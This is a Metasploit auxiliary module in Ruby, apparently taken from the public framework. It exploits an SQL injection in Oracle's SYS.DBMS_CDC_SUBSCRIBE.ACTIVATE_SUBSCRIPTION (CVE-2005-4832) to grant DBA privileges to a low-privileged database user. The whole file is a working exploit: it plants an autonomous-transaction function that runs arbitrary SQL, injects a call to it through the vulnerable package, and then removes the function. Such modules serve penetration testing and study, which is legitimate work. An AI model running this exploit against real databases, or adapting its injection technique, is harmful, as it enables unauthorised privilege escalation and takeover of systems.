##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION',
      'Description'    => %q{
        This module will escalate a Oracle DB user to DBA by exploiting an sql injection
        bug in the SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function.
        This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and
        10g up to 10.1.0.4.
      },
      'Author'         =>
        [
          'Esteban Martinez Fayo', # Vulnerability discovery and exploit
          'juan vazquez'           # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2005-4832'],
          [ 'BID', '13236' ],
          [ 'OSVDB', '15553' ],
          [ 'URL', 'http://www.appsecinc.com/resources/alerts/oracle/2005-02.html'],
          [ 'URL', 'http://www.argeniss.com/research/OraDBMS_CDC_SUBSCRIBEExploit.txt']
        ],
      'DisclosureDate' => 'Apr 18 2005'))

    register_options(
      [
        OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
      ], self.class)
  end

  def run
    return if not check_dependencies

    name = Rex::Text.rand_text_alpha(rand(10) + 1)

    function = "
      create or replace function #{datastore['DBUSER']}.#{name} return varchar2
      authid current_user is pragma autonomous_transaction;
      begin
      execute immediate '#{datastore['SQL']}';
      return '';
      end;
      "

    injection = "
      begin
        sys.dbms_cdc_subscribe.activate_subscription('''||#{datastore['DBUSER']}.#{name}()||''');
      end;
    "

    clean = "drop function #{name}"

    print_status("Sending function...")
    prepare_exec(function)

    begin
      print_status("Attempting sql injection on SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION...")
      prepare_exec(injection)
    rescue ::OCIError => e
    ensure
      print_status("Removing function '#{name}'...")
      prepare_exec(clean)
    end
  end
end
